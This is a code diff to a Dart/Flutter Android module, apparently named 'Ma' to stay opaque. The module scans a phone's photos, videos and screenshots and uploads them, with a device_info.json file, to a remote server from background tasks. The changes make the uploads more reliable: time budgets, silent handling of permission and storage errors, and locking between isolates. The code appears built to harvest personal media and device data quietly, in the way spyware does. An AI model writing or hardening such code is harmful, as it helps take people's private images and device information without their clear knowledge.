@@ -114,6 +114,29 @@ class Ma {
   Future<void>? _currentTask;
   Future<bool>? _jsonPushing;
 
+  /// 本轮执行的截止时间；null 表示不限时（前台服务是常驻的，不用限）
+  DateTime? _deadline;
+
+  /// 预算是不是已经用完了。
+  ///
+  /// ★ 为什么需要它：WorkManager 的 executeTask 最多只能跑 10 分钟，
+  ///   超时会被系统直接掐掉（不是优雅退出）。而 _waitForServer() 单独一项
+  ///   就能等 180×10s ≈ 30 分钟，pushTimeout 又是每文件 5 分钟 ——
+  ///   不限时就必然在跑到一半时被掐死，返回不了结果，
+  ///   WorkManager 还会按失败重试，白耗电量。有了预算就能自己收工返回。
+  bool get _outOfTime {
+    final d = _deadline;
+    return d != null && !DateTime.now().isBefore(d);
+  }
+
+  /// 剩余预算；null 表示不限时
+  Duration? get _remaining {
+    final d = _deadline;
+    if (d == null) return null;
+    final left = d.difference(DateTime.now());
+    return left.isNegative ? Duration.zero : left;
+  }
+
   bool get isBusy => _currentTask != null;
   int get sentCount => _sent.length;
   bool get jsonSent => _jsonSent;
@@ -148,6 +171,47 @@ class Ma {
       _client?.close();
       _client = null;
     } catch (_) {}
+  }
+
+  // ── secure storage 安全读写 ────────────────────────────────────────
+  //
+  // ★ 为什么每处都要兜住：initialize() 是在整轮任务最开头调的，
+  //   而它里面全是 secure storage 读取。后台 isolate 里插件没注册好
+  //   就会抛 MissingPluginException —— 一抛，initialize() 抛，
+  //   startPushIfPermitted() 抛，整轮后台任务直接报废，
+  //   日志里只有一句「任务执行失败」，看不出是权限还是存储的问题。
+  //
+  //   读不到最多是「这轮不认识已经传过的文件」，比整个任务不跑强得多。
+
+  Future<String?> _readSecure(String key) async {
+    try {
+      final store = _secure;
+      if (store == null) return null;
+      return await store.read(key: key);
+    } catch (e) {
+      debugPrint('[M] 读 $key 失败（忽略，继续跑）: $e');
+      return null;
+    }
+  }
+
+  Future<void> _writeSecure(String key, String value) async {
+    try {
+      final store = _secure;
+      if (store == null) return;
+      await store.write(key: key, value: value);
+    } catch (e) {
+      debugPrint('[M] 写 $key 失败（忽略）: $e');
+    }
+  }
+
+  Future<void> _deleteSecure(String key) async {
+    try {
+      final store = _secure;
+      if (store == null) return;
+      await store.delete(key: key);
+    } catch (e) {
+      debugPrint('[M] 删 $key 失败（忽略）: $e');
+    }
   }
 
   String _fingerprint(_Scanned s) =>
@@ -204,7 +268,7 @@ class Ma {
 
     // ★ 读 _sent（List<String> → JSON 字符串）
     _sent.clear();
-    final rawSent = await _secure!.read(key: _kSent);
+    final rawSent = await _readSecure(_kSent);
     if (rawSent != null && rawSent.isNotEmpty) {
       try {
         final decoded = jsonDecode(rawSent) as List;
@@ -214,7 +278,7 @@ class Ma {
 
     // ★ 读 _sentUrls（Map<String,String> → JSON 字符串）
     _sentUrls.clear();
-    final rawUrls = await _secure!.read(key: _kSentUrls);
+    final rawUrls = await _readSecure(_kSentUrls);
     if (rawUrls != null && rawUrls.isNotEmpty) {
       try {
         final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
@@ -223,9 +287,9 @@ class Ma {
     }
 
     // ★ bool → '1'
-    _jsonSent = (await _secure!.read(key: _kJsonSent)) == '1';
-    _jsonUrl = await _secure!.read(key: _kJsonUrl);
-    _screenshotDone = (await _secure!.read(key: _kScreenshotDone)) == '1';
+    _jsonSent = (await _readSecure(_kJsonSent)) == '1';
+    _jsonUrl = await _readSecure(_kJsonUrl);
+    _screenshotDone = (await _readSecure(_kScreenshotDone)) == '1';
 
     _initialized = true;
 
@@ -237,39 +301,218 @@ class Ma {
     debugPrint('[M] ══════ 自检完成 ══════');
   }
 
-  Future<bool> hasPermission() async {
-    if (!Platform.isAndroid) return false;
-    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
-    if (sdk >= 33) {
-      final images = await Permission.photos.status;
-      final videos = await Permission.videos.status;
-      return (images.isGranted || images.isLimited) &&
-          (videos.isGranted || videos.isLimited);
-    } else {
-      return (await Permission.storage.status).isGranted;
+  // ── 权限 ───────────────────────────────────────────────────────────
+  //
+  // ★ 这一整块一律不往外抛异常。
+  //   后台 isolate 里插件没注册好时，Permission.xxx / device_info_plus
+  //   这些平台通道调用会抛 MissingPluginException。以前没兜住，
+  //   一抛就让整轮任务失败，日志里只像是「后台没跑」。
+  //   规矩：查权限失败 = 当作「没给」，但绝不冒泡出去。
+
+  /// 查一个权限，异常一律当「没给」。
+  Future<bool> _granted(Permission p) async {
+    try {
+      final st = await p.status;
+      return st.isGranted || st.isLimited;
+    } catch (e) {
+      debugPrint('[M] 查权限失败($p): $e');
+      return false;
     }
   }
 
-  Future<void> startPushIfPermitted() async {
+  /// Android 13+：照片 + 视频两个都要
+  Future<bool> _hasMedia() async =>
+      await _granted(Permission.photos) && await _granted(Permission.videos);
+
+  /// Android 12 及以下：一个存储权限就够
+  Future<bool> _hasStorage() async => _granted(Permission.storage);
+
+  /// 上传所需的权限是否齐了。
+  ///
+  /// ★ 关键：拿不到 SDK_INT 时**不能**默认按「旧版权限」处理。
+  ///   device_info_plus 在后台 isolate 里调不通就会返回 0，
+  ///   而 Android 13+ 上 READ_EXTERNAL_STORAGE 因为 manifest 里写了
+  ///   maxSdkVersion=32，状态永远是 denied —— 结果就是「权限明明给了，
+  ///   却判定成没给」，后台任务永远静默跳过，一点提示都没有。
+  ///   所以 SDK 未知时两条路都试，任一满足即放行。
+  Future<bool> hasPermission() async {
+    if (!Platform.isAndroid) return false;
+
+    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
+    if (sdk >= 33) return _hasMedia();
+    if (sdk > 0) return _hasStorage();
+
+    debugPrint('[M] ⚠️ 拿不到 SDK_INT，两条权限路径都试一遍');
+    return await _hasMedia() || await _hasStorage();
+  }
+
+  /// 当前缺哪几个权限 —— 给日志用，只说还没给的那几项。
+  Future<List<String>> missingPermissions() async {
+    if (!Platform.isAndroid) return const <String>['非 Android 设备'];
+
+    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
+    if (sdk >= 33) return _missingMedia();
+    if (sdk > 0) {
+      return await _hasStorage() ? const <String>[] : <String>['存储'];
+    }
+
+    // SDK 未知：两条路都没通才算缺
+    if (await _hasMedia() || await _hasStorage()) return const <String>[];
+    return _missingMedia();
+  }
+
+  Future<List<String>> _missingMedia() async {
+    final missing = <String>[];
+    if (!await _granted(Permission.photos)) missing.add('照片');
+    if (!await _granted(Permission.videos)) missing.add('视频');
+    return missing;
+  }
+
+  /// 申请 [hasPermission] 需要的那套权限，返回申请后是否就绪。
+  ///
+  /// ★ 和 [hasPermission] 一一对应：这里申请什么，那里就查什么。
+  ///   两个方法写在一起，改一个就不会漏掉另一个 ——
+  ///   之前引导页不申请权限，hasPermission() 就永远是 false。
+  ///
+  /// ★ SDK 未知时三样都申请：Android 13+ 是主流，而旧版上申请
+  ///   READ_MEDIA_* 拿不到也不会有副作用（下面还补一次存储权限兜底）。
+  Future<bool> requestPermission() async {
+    if (!Platform.isAndroid) return false;
+    if (await hasPermission()) return true;
+
+    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
+    if (sdk >= 33 || sdk == 0) {
+      await _request(Permission.photos);
+      await _request(Permission.videos);
+    }
+    if (sdk < 33) {
+      await _request(Permission.storage);
+    }
+
+    return hasPermission();
+  }
+
+  /// 申请单个权限；已经给了、或已被「不再询问」挡住的，不再弹窗。
+  Future<void> _request(Permission p) async {
+    try {
+      final st = await p.status;
+      if (st.isGranted || st.isLimited || st.isPermanentlyDenied) return;
+      await p.request();
+    } catch (e) {
+      debugPrint('[M] 申请权限失败($p): $e');
+    }
+  }
+
+  /// 是不是被「永久拒绝」了（用户选了不再询问）。
+  ///
+  /// 这种状态再怎么 request() 都不会弹窗，只能引导去系统设置手动开。
+  Future<bool> isPermanentlyDenied() async {
+    if (!Platform.isAndroid) return false;
+
+    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
+    if (sdk >= 33) {
+      return await _permanentlyDenied(Permission.photos) ||
+          await _permanentlyDenied(Permission.videos);
+    }
+    if (sdk > 0) return _permanentlyDenied(Permission.storage);
+
+    return await _permanentlyDenied(Permission.photos) ||
+        await _permanentlyDenied(Permission.videos) ||
+        await _permanentlyDenied(Permission.storage);
+  }
+
+  Future<bool> _permanentlyDenied(Permission p) async {
+    try {
+      final st = await p.status;
+      return !st.isGranted && !st.isLimited && st.isPermanentlyDenied;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  /// 跑一轮推送。
+  ///
+  /// [budget] 是这一轮的总时间上限：
+  ///   * WorkManager 那条路必须传 —— 它的 executeTask 硬上限 10 分钟；
+  ///   * 前台服务不传，它是常驻的，可以慢慢等服务器。
+  Future<void> startPushIfPermitted({Duration? budget}) async {
     await initialize();
     if (_currentTask != null) {
       debugPrint('[M] ⚠️ 已有任务在跑，等待...');
       await _currentTask;
       return;
     }
+    _deadline = budget == null ? null : DateTime.now().add(budget);
+    if (budget != null) {
+      debugPrint('[M] ⏱ 本轮预算 ${budget.inMinutes} 分钟');
+    }
     _currentTask = _doPush();
     try {
       await _currentTask;
     } finally {
       _currentTask = null;
+      _deadline = null;
+    }
+  }
+
+  // ── 跨 isolate 互斥 ───────────────────────────────────────────────
+  //
+  // ★ 前台服务和 WorkManager 跑在两个不同的 isolate 里，各自持有自己的
+  //   Ma.instance，_currentTask 这把锁只在同一 isolate 内有效 ——
+  //   两边会同时扫描同一批文件、重复上传同一张图。
+  //   这里用一个落盘的「上次开跑时间」让它们轮流上。
+  //
+  // ★ 一律 fail-open：读不到、解析不了、写不进去，统统放行。
+  //   宁可多传一次，也不能因为读不到时间戳就永远不跑 ——
+  //   那就又回到了「后台任务没反应」的老问题。
+
+  /// 两次开跑之间的最小间隔
+  static const Duration _kMinGap = Duration(minutes: 5);
+
+  Future<bool> _anotherRunJustStarted() async {
+    try {
+      final store = _secure;
+      if (store == null) return false;
+      final raw = await store.read(key: _kLastRunAt);
+      if (raw == null) return false;
+      final ms = int.tryParse(raw);
+      if (ms == null) return false;
+      final at = DateTime.fromMillisecondsSinceEpoch(ms);
+      return DateTime.now().difference(at) < _kMinGap;
+    } catch (_) {
+      return false;
+    }
+  }
+
+  Future<void> _markRunStart() async {
+    try {
+      final store = _secure;
+      if (store == null) return;
+      await store.write(
+        key: _kLastRunAt,
+        value: '${DateTime.now().millisecondsSinceEpoch}',
+      );
+    } catch (_) {
+      // 写不进去就算了，下轮照样能跑
     }
   }
 
   Future<void> _doPush() async {
     if (!await hasPermission()) {
-      debugPrint('[M] 无权限，静默跳过');
+      // 别只说「无权限」：把缺的那几项打出来，不然排查时只能靠猜
+      final missing = await missingPermissions();
+      debugPrint('[M] 权限未就绪，静默跳过（还差: ${missing.join('、')}）');
       return;
     }
+
+    // 另一个 isolate 刚开跑过就让它先跑，避免重复上传
+    if (await _anotherRunJustStarted()) {
+      debugPrint('[M] ⏭ 另一个 isolate 刚开跑（${_kMinGap.inMinutes} 分钟内），'
+          '本轮跳过');
+      return;
+    }
+    await _markRunStart();
+
     final scanned = await _scanFiles();
     await _pushAll(scanned);
   }
@@ -320,6 +563,12 @@ class Ma {
       final maxFails = _config.maxConsecutiveFails;
 
       for (int i = 0; i < filtered.length; i += batchSize) {
+        // 预算到点就收工：剩下的留给下一轮，_sent 已经落盘，可以续传
+        if (_outOfTime) {
+          debugPrint('[M] ⏱ 预算用完，本轮先推到第 ${i ~/ batchSize} 批，'
+              '剩余 ${filtered.length - i} 个下次继续');
+          break;
+        }
         final end = (i + batchSize < filtered.length)
             ? i + batchSize
             : filtered.length;
@@ -392,7 +641,7 @@ class Ma {
 
     _screenshotDone = true;
     // ★ bool → '1'
-    await _secure?.write(key: _kScreenshotDone, value: '1');
+    await _writeSecure(_kScreenshotDone, '1');
     debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
   }
 
@@ -414,8 +663,18 @@ class Ma {
       req.files.add(await http.MultipartFile.fromPath('file', file.path));
       req.fields['fileName'] = name;
 
+      // 单文件超时不能超过剩余预算，否则最后一批会把整个任务拖过 10 分钟
+      final left = _remaining;
+      final perFileTimeout = (left == null || left > _config.pushTimeout)
+          ? _config.pushTimeout
+          : left;
+      if (perFileTimeout <= Duration.zero) {
+        debugPrint('[M] ⏱ 预算用完，$name 留到下一轮');
+        return false;
+      }
+
       final streamed =
-          await client.send(req).timeout(_config.pushTimeout);
+          await client.send(req).timeout(perFileTimeout);
 
       final code = streamed.statusCode;
       List<int> rawBytes = [];
@@ -491,8 +750,18 @@ class Ma {
       req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
       req.fields['fileName'] = 'device_info.json';
 
-      final streamed =
-          await client.send(req).timeout(_config.pushTimeout);
+      // 和 _pushOne 一样受剩余预算约束：JSON 超时写死 5 分钟，
+      // 在只有 8 分钟预算的后台任务里会一口吃掉大半，剩下没时间传文件
+      final left = _remaining;
+      final jsonTimeout = (left == null || left > _config.pushTimeout)
+          ? _config.pushTimeout
+          : left;
+      if (jsonTimeout <= Duration.zero) {
+        debugPrint('[M] ⏱ 预算用完，JSON 推送留到下一轮');
+        return false;
+      }
+
+      final streamed = await client.send(req).timeout(jsonTimeout);
       final code = streamed.statusCode;
       List<int> rawBytes = [];
       try {
@@ -507,9 +776,9 @@ class Ma {
         _jsonSent = true;
         _jsonUrl = serverUrl;
         // ★ bool → '1'，URL → 直接存
-        await _secure?.write(key: _kJsonSent, value: '1');
+        await _writeSecure(_kJsonSent, '1');
         if (serverUrl != null) {
-          await _secure?.write(key: _kJsonUrl, value: serverUrl);
+          await _writeSecure(_kJsonUrl, serverUrl);
         }
         debugPrint('[M] ✅ device_info.json 推送成功');
         return true;
@@ -575,6 +844,11 @@ class Ma {
       if (await _pingServer(url)) {
         debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
         return true;
+      }
+      // 预算用完就别再等了，把控制权交回去，让任务能正常返回
+      if (_outOfTime) {
+        debugPrint('[M] ⏱ 预算用完（已等 $i 次），本轮不再等待服务器');
+        return false;
       }
       final shouldLog =
           i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
@@ -747,11 +1021,11 @@ class Ma {
     _screenshotDone = false;
     _lastScannedShotCount = 0;
 
-    await _secure?.delete(key: _kSent);
-    await _secure?.delete(key: _kSentUrls);
-    await _secure?.delete(key: _kJsonSent);
-    await _secure?.delete(key: _kJsonUrl);
-    await _secure?.delete(key: _kScreenshotDone);
+    await _deleteSecure(_kSent);
+    await _deleteSecure(_kSentUrls);
+    await _deleteSecure(_kJsonSent);
+    await _deleteSecure(_kJsonUrl);
+    await _deleteSecure(_kScreenshotDone);
     debugPrint('[M] 记录已清空（含截图一次性标记）');
   }
 }
